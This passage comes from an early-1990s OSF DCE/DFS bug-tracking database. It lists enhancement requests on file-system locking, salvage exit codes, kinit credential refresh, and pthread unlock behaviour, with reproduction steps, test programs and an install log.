Add a horde of people who should be following this discussion to the cc list.

Just to add my own two cents here.  I think we can use a scheme
similar to what Craig suggests.  Both Episode and the CM need to
analyze their respective {efs,cm}_sync() paths so the locking there
can handle lock-grabbing failures without deadlocking when
osi_DoingPanic() returns true.  Zero-th order deadlock avoidance is to
check this condition in *_sync() and just return if panicing - punting
the whole locking issue altogether.  The CM may have no choice but to
do this.  Episode needs to try harder.

I've opened a separate defect for the cm_sync() case under OT 5421.
Filled in Inter-dependent CRs with `5421' 
Filled in Interest List CC with `ota,mason,kazar,cfe'

[9/29/92 public]
This is an enhancement request.

Changed Defect or Enhancement? from `def' to `enh'

[12/3/92 public]

OT 6066 is the placeholder for the zeroth-order work in Episode which
Tony mentions above (just punt).  We'll leave this OT (5417) open as a
placeholder for the ``real'' implementation.

Oh, and the panic check call is (going to be) called osi_IsKernelPanic().

Changed Inter-dependent CRs from `5421' to `5421,6066' 
Changed Interest List CC from `ota,mason,kazar,cfe' to 
 `ota,mason,kazar,cfe,mcinerny'

[2/12/93 public]
I thought I rembered seeing some changes go in a while back to address
this problem.  Is it possible that this ot bug can be dupped to another
and cancelled, or is this still a problem?
Changed Interest List CC from `ota,mason,kazar,cfe,mcinerny' to 
 `ota,mason,kazar,cfe,mcinerny,demail1!carl'

[2/12/93 public]
Adding Jeff Prem (and removing Mike McInerny) from the CC list since he
might have supplanted this work entirely.
Changed Interest List CC from `ota,mason,kazar,cfe,mcinerny,demail1!carl' to 
 `ota,mason,kazar,cfe,demail1!carl,jdp'

[2/12/93 public]
Right.  This work is already done.

Changed Status from `open' to `cancel'

[2/12/93 public]
Sorry, I didn't mean to cancel this one.  I guess I should have read it
better.

Changed Status from `cancel' to `open'



CR Number                     : 5401
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : rep
Short Description             : release rep does extra work
Reported Date                 : 9/16/92
Found in Baseline             : 1.0.2
Found Date                    : 9/16/92
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Status               : open
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com

[9/16/92 public]
Release-style replication seems to do a little too much work.
(a) The repserver maintains RPC contact with the file exporter on the
    primary site, even though it doesn't actually get tokens.
(b) The tell-all-other-sites code that propagates data and FLDB update
    notices includes the distinguished-rep-site location in its list
    of sites to inform about changes.

These are little niceties, and the problems are benign (just a bit more
overhead, no loss of functionality), so this is an enhancement.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[10/15/92 public]
Filled in Interest List CC with `demail1!pehkonen' 
Added field #Transarc Deltas with value `' 
Added field #Transarc Herder with value `' 
Added field #Transarc Status with value `'



CR Number                     : 5377
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Salvage exit values can be misleading
Reported Date                 : 9/11/92
Found in Baseline             : 1.0.1b24
Found Date                    : 9/11/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[9/11/92 public]
If a non-root user issues salvage (by itelf or with the -nosalvage,
-norecover, -recover option) on an aggregate for which the user has
read access but not write access, the salvage command fails with an
exit value of 0xd (13).
13 is the EACCES errno returned by the open call on the raw device.
The code assigns this to variable ac. Later the return code from
VerifyEpisode is also assigned to variable ac and the value of ac is
used in the exit call at the end of salvage(). 
The man page for salvage advises that exit values >= 0x8 indicate
that the aggregate is irreparable damaged and a newaggr should be used.
NOTE: A possible solution is to shift the bits used for the EXIT_xxxxx
codes to the left by one. i.e. assign EXIT_PROBLEMS=0x2, EXIT_REPAIRS=0x4....
instead of the current assignments of EXIT_PROBLEM=0x1, EXIT_REPAIRS=0x2... .
The exit value of 1 could then be to map miscellaneous problems like the 
open call failing in this case.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[10/27/92 public]
Reassigned to Blake
Changed Interest List CC from `mason@transarc.com' to `mason,ota' 
Changed Responsible Engr. from `ota@transarc.com' to `blake@transarc.com'

[9/30/93 public]
This problem would be a minor confusion at worst.  Marked as enhancement.
We will track this under DB4412.
Filled in Reported by Company's Ref. Number with `4412'

[9/30/93 public]
Changed Defect or Enhancement? from `def' to `enh'



CR Number                     : 5356
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : fts
Short Description             : fts tests use unsupported commands
Reported Date                 : 9/9/92
Found in Baseline             : 1.0.2
Found Date                    : 9/9/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[9/9/92 public]

Vijay has reported a couple of problems with stand-alone episode
commands used within the fts test suite.  Since these commands are
unsupported, they really shouldn't be used in the fts test suite.
"newvol" should probably be replaced by "fts" or "efts" commands (efts
is part of the test code base).

Also, strictly speaking, local Episode mounting is also not a DCE
supported feature.  It is unwise to depend upon it working properly.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[10/15/92 public]
Changed Interest List CC from `bwl@transarc.com,comer@transarc.com' to 
 `bwl@transarc.com,comer@transarc.com,demail1!felps'

[10/19/92 public]
The standalone episode tests in the fts test suite are now named sepitest1 and
sepitest2. They should be removed from the fts test suite and should be placed
as part of any existing standalone episode test suite. I'm assigning this to
Rajesh because he is responsible for standalone episode tests, as far as I 
know.

Changed Interest List CC from 
 `bwl@transarc.com,comer@transarc.com,demail1!felps' to 
 `bwl@transarc.com,comer@transarc.com,demail1!felps, vijay@transarc.com' 
Changed Responsible Engr. from `vijay@transarc.com' to `rajesh@transarc.com'

[10/19/92 public]

Changing to an enhancement request.

Changed Defect or Enhancement? from `def' to `enh'



CR Number                     : 5328
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 5322, 5327
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : make salvage provide more descriptive error messages
Reported Date                 : 9/3/92
Found in Baseline             : 1.0.2
Found Date                    : 9/3/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[9/3/92 public]
The message about invalid fid is should print the fid and other info
about why it might be bad.  The ENOENT path should produce a different
message.
The message about damage root directory is even worse.  Generate lower
level messages to augment this error.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[9/29/92 public]
This is an enhancement request.
Changed Defect or Enhancement? from `def' to `enh'

[1/24/94 public]
Changed Subcomponent Name from `lfs' to `EPISODE'



CR Number                     : 5301
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : px
Short Description             : PX should consult FLDB before timing out move (TSR)
Reported Date                 : 9/2/92
Found in Baseline             : 1.0.2
Found Date                    : 9/2/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[9/2/92 public]
As part of the token state recovery changes, a fileset move operation 
maintains a timeout value in the future for both the source and
target of a fileset move.  When the PX looks up a volume that is
either the source or target of a fileset move, it checks the timeout
values to see if the move is still in progress or if some disconnect
has occurred.  Currently, if the timeout has expired, the PX will
reset the move-in-progress (VOL_MOVE_{SOURCE,TARGET}) flag and 
continue.  What it should do is to consult the FLDB as to the
state of the fileset and clean things up as appropriate.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[11/7/92 public]
I view this as an enhancement, since right now, re-issuing the fts command
will clean up the appropriate state.  While it would be nice for the
file server to do this cleanup automatically, that's not the current
model.
Changed Defect or Enhancement? from `def' to `enh'

[3/30/94 public]
We're looking at this for 1.1

[3/30/94 public]
There's been a lot of work on fileset move since Mike Comer's report.
In particular, the VOL_MOVE_TARGET and VOL_MOVE_SOURCE flags aren't simply
cleared when the volMoveTimeout expires; there's a whole sequence of states
through which the fileset state parades.
 
There are stub hooks, though, to the PX to get it to take specific cleanup
actions on some of the expirations of these timeouts.  The PX doesn't
do anything with them, but it could do so.



CR Number                     : 5255
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 5367
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : lfs
Short Description             : Need improved recovery testing
Reported Date                 : 8/31/92
Found in Baseline             : 1.0.2
Found Date                    : 8/31/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[8/31/92 public]
Work must be done to improve the testing and regressability of the
Episode recovery code.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[9/9/92 public]
OT 5367 has been created for the authorization check test.
Filled in Inter-dependent CRs with `5367'



CR Number                     : 5233
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : kinit
Short Description             : kinit only refreshing TGT (not rest of DCE info...)
Reported Date                 : 8/27/92
Found in Baseline             : 1.0.1
Found Date                    : 8/27/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : mason@transarc.com
Transarc Status               : open

[8/27/92 public]

Using kinit after doing a dce_login on an account for which the primary
goup information has changed causes the group information in the credential
cache to show up as "group name unknown".

To recreate this, do the following:

Create an account in the registry for e.g.

rgy_edit=>add brad -g foo -o none -pw brad -mp -dce- -av

where "brad" and "foo" are principal and group entities that were 
earlier created.

Next do a dce_login as brad and do a klist. The output of klist is:

# klist
DCE Identity Information:
        Warning: Identity information is not certified
        Global Principal: /.../sydney.dce.transarc.com/brad
        Cell:      006C4C7E-ACF3-1A9B-AF56-08005A4D1B20 /.../sydney.dce.transa
rc.com
        Principal: 0000006C-01B3-2A9D-9A00-08005A4D1B20 brad
        Group:     0000006E-01A6-2A9C-9A01-08005A4D1B20 foo
        Local Groups:
                0000006E-01A6-2A9C-9A01-08005A4D1B20 foo

Identity Info Expires: 92/08/27:22:24:54
Account Expires:       never
Passwd Expires:        never

Kerberos Ticket Information:
Ticket cache: /opt/dcelocal/var/security/creds/dcecred_388bd800
Default principal: brad@sydney.dce.transarc.com
Server: krbtgt/sydney.dce.transarc.com@sydney.dce.transarc.com
        valid 92/08/27:12:24:54 to 92/08/27:22:24:54
Server: dce-rgy@sydney.dce.transarc.com
        valid 92/08/27:12:24:56 to 92/08/27:22:24:54
Server: dce-ptgt@sydney.dce.transarc.com
        valid 92/08/27:12:25:00 to 92/08/27:14:25:00
Client: dce-ptgt@sydney.dce.transarc.com        Server: krbtgt/sydney.dce.tran
sarc.com@sydney.dce.transarc.com
        valid 92/08/27:12:25:01 to 92/08/27:14:25:00
Client: dce-ptgt@sydney.dce.transarc.com        Server: dce-rgy@sydney.dce.tra
nsarc.com
        valid 92/08/27:12:25:03 to 92/08/27:14:25:00

Now change the account information of "brad" in the registry and change
his group to "none". Then do a kinit as "brad" again in the same window,
followed by a klist. The output this time is:

# kinit
Enter password:
# klist
DCE Identity Information:
        Warning: Identity information is not certified
        Global Principal: /.../sydney.dce.transarc.com/brad
        Cell:      006C4C7E-ACF3-1A9B-AF56-08005A4D1B20 /.../sydney.dce.transa
rc.com
        Principal: 0000006C-01B3-2A9D-9A00-08005A4D1B20 brad
        Group:     0000006E-01A6-2A9C-9A01-08005A4D1B20 <group name unknown>
        Local Groups:
                0000006E-01A6-2A9C-9A01-08005A4D1B20 <group name unknown>

Identity Info Expires: 92/08/27:22:29:06
Account Expires:       never
Passwd Expires:        never

Kerberos Ticket Information:
Ticket cache: /opt/dcelocal/var/security/creds/dcecred_388bd800
Default principal: brad@sydney.dce.transarc.com
Server: krbtgt/sydney.dce.transarc.com@sydney.dce.transarc.com
        valid 92/08/27:12:29:08 to 92/08/27:22:29:06
Server: dce-ptgt@sydney.dce.transarc.com
        valid 92/08/27:12:29:14 to 92/08/27:14:29:14
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `mason@transarc.com' 
Added field Transarc Status with value `open'

[8/27/92 public]
This seems to be a problem with groups in security, not cds or nsi.

[10/12/92 public]
Assigned it to myself.  I have no idea why it was assigned to saxena@transarc,
but it's obviously security related, not DFS.

[10/15/92 public]

OT cleanup 1 : New Severity : C ;  Priority : unchanged (2)
               Old severity : B 

N.B. I have lowered the severity to C which means that it would be nice
     to fix this in 1.0.2 but will be done only if there is time. 
     Severity B implies that this MUST be fixed on 1.0.2 . I have done this
     because there seems to be a workaround i.e. after the group has been 
     changed log out and dce_login back in. 

     If this is not an acceptable workaround or my understanding of the 
     bug is incorrect, please update this report.

[11/20/92 public]
This is not a problem of kinit messing up the group name.  kinit is refreshing
the TGT, but not the rest of the DCE information.  When klist goes to get the
group name with sec_id_gen_group() it uses sec_rgy_default_handle for the
registry binding handle.  This tries to bind to /.: to set up the default
handle, thus it must call rpc_binding_set_auth_info with the client's pac.
The group in the client's pac is not the same as that stored for that account
in the server now, so the priv server (line 812 of server/rs/rpriv.c) returns
sec_priv_s_invalid_principal and the rpc_binding_set_auth_info fails, causing
the default handle setup to fail, causing the sec_id_gen_group to fail, which
is why it can only print out the uuid for the group.  The following is the
comment about the check in rpriv.c, and I was just going to close this as
"not a bug" based on it being correct as coded, but Bill wants to think about
whether kinit should be refreshing everything, since it's supposedly integrated
with DCE, so I'm leaving it open and reassigning it to him.
        /* 
         * check the principal and group uuid asserted by the client
         * in the request's autorization data against the prinicipal
         * and group uuids current for the named client.  If they differ,
         * either the client screwed up, or an administrator has changed
         * the principal's credentials after the client logged in. 
         * 
         *XXX we fail for now, but we might want to consider alternatives
         *    to failure when only the primary group has changed e.g., we
         *    might want to add the client asserted primary group to
         *    client-asserted groupinfo, causing the old primary group
         *    to appear in the client's groupset, if the client is a 
         *    member of the old primary group.
         */
        if (!(uuid_equal(&sid.person, &authz_data.principal.uuid, stp)
               && uuid_equal(&sid.group, &authz_data.group.uuid, stp))) {
            SET_STATUS(stp, sec_priv_s_invalid_principal);
        }

[12/8/92 public]
Bill and I agree that this is an enhancement request for kinit to refresh the
DCE information too (not just the TGT).  It currently operates as designed.



CR Number                     : 5223
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : EPISODE
Short Description             : Need log mgmt. utility (epilog)
Reported Date                 : 8/26/92
Found in Baseline             : 1.0.2
Found Date                    : 8/26/92
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open
Transarc Delta                : 

[8/26/92 public]
At present, there is no tool for manipulating the log; the only way to make
the log bigger is to save the aggregate, run newaggr, and then restore the
aggregate.  Although a work-around, it seems cumbersome.
I'd like to see an 'epilog' program (what else?) that would allow the user
to:
1) examine the size of the existing log and print out the throttling
characteristics (e.g. # of simultaneous transactions), possibly with some
extra switch.
2) examine the log and determine if it is clean;
3) examine the log and dump its contents in the ASCII format defined in
recover.c (a la findlog/readlog).
4) change the size of the log on a quiescent system.
5) [Very optional] recover the log.  I realize that the salvager already does
this, so maybe it is a bad idea to have repetition in the functionality.
One "advantage" here is that it would allow us to eliminate two other
programs (findlog and readlog) that are ill supported but useful and replace
it with a single program that is supported and more generally useful.
This is an enhancement request.
I've added Jeff K. to the list, as any new command will have impact on
documentaiton.
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `jaffe@transarc.com' 
Added field Transarc Status with value `open'

[11/16/92 public]
Should this be deferred out of 1.0.2?
Changed Interest List CC from `jeff@transarc.com,ota@transarc.com' to 
 `jeff,ota'

[11/15/93 public]
Changed Responsible Engr. from `mason@transarc.com' to `ota@transarc.com' 
Added field Transarc Delta with value `'

[1/24/94 public]
Changed Subcomponent Name from `lfs' to `EPISODE'



CR Number                     : 5213
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : thr
Subcomponent Name             : pthread_unlock_global_np
Short Description             : pthread_unlock_global_np(3thr)
returns an exception when called twice or called by a non-owner
Reported Date                 : 8/26/92
Found in Baseline             : 1.0.1
Found Date                    : 8/26/92
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/26/92 public]

        An exception is returned when extra pthread_unlock_global_np() is
	called, or called by a thread which is not the owner.

	Although the man page clearly says that the behavior under such
	cases is undefined, a warning or error return would be more
	proper.

	The following are two test cases:

---------------------cut here for test 1---------------------------
#include <pthread.h>
#include <cts_test.h>

main()
{

        cts_test("lock", "test");
        pthread_lock_global_np();
        pthread_unlock_global_np();

        pthread_unlock_global_np();

        cts_result();

}

----------------------cut here for test 2-------------------------------
#include <pthread.h>
#include <cts_test.h>

static void locker()
{
    /* lock the global mutex for trouble */
    pthread_lock_global_np();

    /* now back to the creating routine */
    pthread_yield();
}

static void not_owner()
{
    pthread_t thread;
    int status;

    status = pthread_create (
                &thread,
                pthread_attr_default,
                (pthread_startroutine_t)locker,
                (pthread_addr_t)0);
    check(status,"pthread_create");

    pthread_yield();            /* give it a chance to lock */

   /*
    * the man page says the result of unlocking the global mutex
    * when it is owned by another thread is undefined
    */
    pthread_unlock_global_np();
}

main ()
{
    struct timespec delay;
    int status;
    int join_status;
    pthread_addr_t      result;

    cts_test ("unlock_global_err","Test errors for pthread_global_unlock_np()");

    printf("not_owner();\n");
    not_owner();

    cts_result ();

}

[01/21/93 public]

The person who filed this defect originally (From HaL Computers) came back
to ask and ask if it has been fixed in 1.0.2. When he got to know that it
is still open, he expressed his concern and asked if the priority can be
raised.

[01/25/93 public]
I agree it would be nice to warn the programmer rather than
raise the exception in this and probably a number of other 
calls that are documented as undefined under various circumstances.
But I don't beleive there is time in the 1.0.2 schedule. If
I get come slack I'll look at it but I can't commit to it.



CR Number                     : 5131
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 5992, 5993
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : 
Short Description             : files installed from dfs are incorrect
Reported Date                 : 8/19/92
Found in Baseline             : 1.0.1
Found Date                    : 8/19/92
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : jaffe@transarc.com
Transarc Status               : open

[8/19/92 public]
when I did a build install_all, I noticed that a lot of stuff
that looked unnecessary got installed from dfs.  In some cases
the files are questionable (should  xxx interfaces be visible to dce
applications programmers ?) In some cases they are just incorrect.
For example, dacl.h is installed, but it has includes of the
form <afs/param.h> which refer to other files which are not installed.
In any case, I believe that someone should examine all of the files
which are installed from DFS and determine whether they really should
be installed.  I've enclosed an install log as a starting point for
this examination.

 [ /file/tools/cmd ]
makepath cmd/. && cd cmd &&  exec make MAKEFILE_PASS=BASIC    install_all
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile dfscmd.cat /nls/msg/en_US.ASCII/dfscmd.cat 
/nls/msg/en_US.ASCII/dfscmd.cat: copying from dfscmd.cat
/nls/msg/en_US.ASCII/dfscmd.cat: owner bin, group bin, mode 0755
/nls/msg/en_US.ASCII/dfscmd.cat: installing as /build/dce386/install/nls/msg/en_US.ASCII/dfscmd.cat
 [ /file/config ]
makepath config/. && cd config &&  exec make MAKEFILE_PASS=BASIC    install_all
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile /net/balder/build/dce1.0.1/src/file/config/common_def.h /share/include/dce/common_def.h 
/share/include/dce/common_def.h: copying from /net/balder/build/dce1.0.1/src/file/config/common_def.h
/share/include/dce/common_def.h: owner bin, group bin, mode 0755
/share/include/dce/common_def.h: installing as /build/dce386/install/share/include/dce/common_def.h
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile common_data.h /share/include/dce/common_data.h 
/share/include/dce/common_data.h: copying from common_data.h
/share/include/dce/common_data.h: owner bin, group bin, mode 0755
/share/include/dce/common_data.h: installing as /build/dce386/install/share/include/dce/common_data.h
 [ /file/util ]
makepath util/. && cd util &&  exec make MAKEFILE_PASS=BASIC    install_all
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile /net/balder/build/dce1.0.1/src/file/util/ktime.h /share/include/dce/ktime.h 
/share/include/dce/ktime.h: copying from /net/balder/build/dce1.0.1/src/file/util/ktime.h
/share/include/dce/ktime.h: owner bin, group bin, mode 0755
/share/include/dce/ktime.h: installing as /build/dce386/install/share/include/dce/ktime.h
 [ /file/kutils ]
makepath kutils/. && cd kutils &&  exec make MAKEFILE_PASS=BASIC    install_all
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile /net/balder/build/dce1.0.1/src/file/kutils/ioctl.h /share/include/dce/ioctl.h 
/share/include/dce/ioctl.h: copying from /net/balder/build/dce1.0.1/src/file/kutils/ioctl.h
/share/include/dce/ioctl.h: owner bin, group bin, mode 0755
/share/include/dce/ioctl.h: installing as /build/dce386/install/share/include/dce/ioctl.h
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile /net/balder/build/dce1.0.1/src/file/kutils/syscall.h /share/include/dce/syscall.h 
/share/include/dce/syscall.h: copying from /net/balder/build/dce1.0.1/src/file/kutils/syscall.h
/share/include/dce/syscall.h: owner bin, group bin, mode 0755
/share/include/dce/syscall.h: installing as /build/dce386/install/share/include/dce/syscall.h
 [ /file/sysacl ]
makepath sysacl/. && cd sysacl &&  exec make MAKEFILE_PASS=BASIC    install_all
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile /net/balder/build/dce1.0.1/src/file/sysacl/aclint.h /share/include/dce/aclint.h 
/share/include/dce/aclint.h: copying from /net/balder/build/dce1.0.1/src/file/sysacl/aclint.h
/share/include/dce/aclint.h: owner bin, group bin, mode 0755
/share/include/dce/aclint.h: installing as /build/dce386/install/share/include/dce/aclint.h
 [ /file/security/dacl ]
makepath dacl/. && cd dacl &&  exec make MAKEFILE_PASS=BASIC    install_all
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile testacl.o /share/include/dce/testacl.o 
/share/include/dce/testacl.o: copying from testacl.o
/share/include/dce/testacl.o: owner bin, group bin, mode 0755
/share/include/dce/testacl.o: installing as /build/dce386/install/share/include/dce/testacl.o
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile /net/balder/build/dce1.0.1/src/file/security/dacl/dacl_mgruuids.h /share/include/dce/dacl_mgruuids.h 
/share/include/dce/dacl_mgruuids.h: copying from /net/balder/build/dce1.0.1/src/file/security/dacl/dacl_mgruuids.h
/share/include/dce/dacl_mgruuids.h: owner bin, group bin, mode 0755
/share/include/dce/dacl_mgruuids.h: installing as /build/dce386/install/share/include/dce/dacl_mgruuids.h
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile dacl.h /share/include/dce/dacl.h 
/share/include/dce/dacl.h: copying from dacl.h
/share/include/dce/dacl.h: owner bin, group bin, mode 0755
/share/include/dce/dacl.h: installing as /build/dce386/install/share/include/dce/dacl.h
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile dfsdcl.cat /nls/msg/en_US.ASCII/dfsdcl.cat 
/nls/msg/en_US.ASCII/dfsdcl.cat: copying from dfsdcl.cat
/nls/msg/en_US.ASCII/dfsdcl.cat: owner bin, group bin, mode 0755
/nls/msg/en_US.ASCII/dfsdcl.cat: installing as /build/dce386/install/nls/msg/en_US.ASCII/dfsdcl.cat
 [ /file/security/dfsauth ]
makepath dfsauth/. && cd dfsauth &&  exec make MAKEFILE_PASS=BASIC    install_all
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile dfsauth.h /share/include/dce/dfsauth.h 
/share/include/dce/dfsauth.h: copying from dfsauth.h
/share/include/dce/dfsauth.h: owner bin, group bin, mode 0755
/share/include/dce/dfsauth.h: installing as /build/dce386/install/share/include/dce/dfsauth.h
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile dfsdau.cat /nls/msg/en_US.ASCII/dfsdau.cat 
/nls/msg/en_US.ASCII/dfsdau.cat: copying from dfsdau.cat
/nls/msg/en_US.ASCII/dfsdau.cat: owner bin, group bin, mode 0755
/nls/msg/en_US.ASCII/dfsdau.cat: installing as /build/dce386/install/nls/msg/en_US.ASCII/dfsdau.cat
 [ /file/fsint ]
makepath fsint/. && cd fsint &&  exec make MAKEFILE_PASS=BASIC    install_all
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile afs4int.h /share/include/dce/afs4int.h 
/share/include/dce/afs4int.h: copying from afs4int.h
/share/include/dce/afs4int.h: owner bin, group bin, mode 0755
/share/include/dce/afs4int.h: installing as /build/dce386/install/share/include/dce/afs4int.h
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile tkn4int.h /share/include/dce/tkn4int.h 
/share/include/dce/tkn4int.h: copying from tkn4int.h
/share/include/dce/tkn4int.h: owner bin, group bin, mode 0755
/share/include/dce/tkn4int.h: installing as /build/dce386/install/share/include/dce/tkn4int.h
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile rep_data.h /share/include/dce/rep_data.h 
/share/include/dce/rep_data.h: copying from rep_data.h
/share/include/dce/rep_data.h: owner bin, group bin, mode 0755
/share/include/dce/rep_data.h: installing as /build/dce386/install/share/include/dce/rep_data.h
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile rep_proc.h /share/include/dce/rep_proc.h 
/share/include/dce/rep_proc.h: copying from rep_proc.h
/share/include/dce/rep_proc.h: owner bin, group bin, mode 0755
/share/include/dce/rep_proc.h: installing as /build/dce386/install/share/include/dce/rep_proc.h
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile rep_errs.h /share/include/dce/rep_errs.h 
/share/include/dce/rep_errs.h: copying from rep_errs.h
/share/include/dce/rep_errs.h: owner bin, group bin, mode 0755
/share/include/dce/rep_errs.h: installing as /build/dce386/install/share/include/dce/rep_errs.h
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile dfsrep.cat /nls/msg/en_US.ASCII/dfsrep.cat 
/nls/msg/en_US.ASCII/dfsrep.cat: copying from dfsrep.cat
/nls/msg/en_US.ASCII/dfsrep.cat: owner bin, group bin, mode 0755
/nls/msg/en_US.ASCII/dfsrep.cat: installing as /build/dce386/install/nls/msg/en_US.ASCII/dfsrep.cat
 [ /file/xaggr ]
makepath xaggr/. && cd xaggr &&  exec make MAKEFILE_PASS=BASIC    install_all
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile dfsexport /bin/dfsexport 
/bin/dfsexport: copying from dfsexport
/bin/dfsexport: owner bin, group bin, mode 0755
/bin/dfsexport: installing as /build/dce386/install/bin/dfsexport
release   -o bin -g bin -m 755 -tostage /build/dce386/install -fromfile /net/balder/build/dce1.0.1/src/file/xaggr/aggr.h /share/include/dce/aggr.h

[2/8/93 public]
Here are the names referred to by .h files in share/include/dcedfs that
are not currently installed:
afs4int_s2c.h
afsvl_data.h
afsvl_proc.h
afsvl_s2c.h
bubasics.h
debug.h
epi_id.h
lock.h
osi.h
osi_buf.h
osi_cred.h
osi_dfserrors.h
osi_net.h
osi_param.h
osi_uio.h
param.h
queue.h
stds.h
tkm_hostData.h
xvfs_vnode.h

Installing these, plus our .idl files, should handle this bug.



CR Number                     : 5083
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
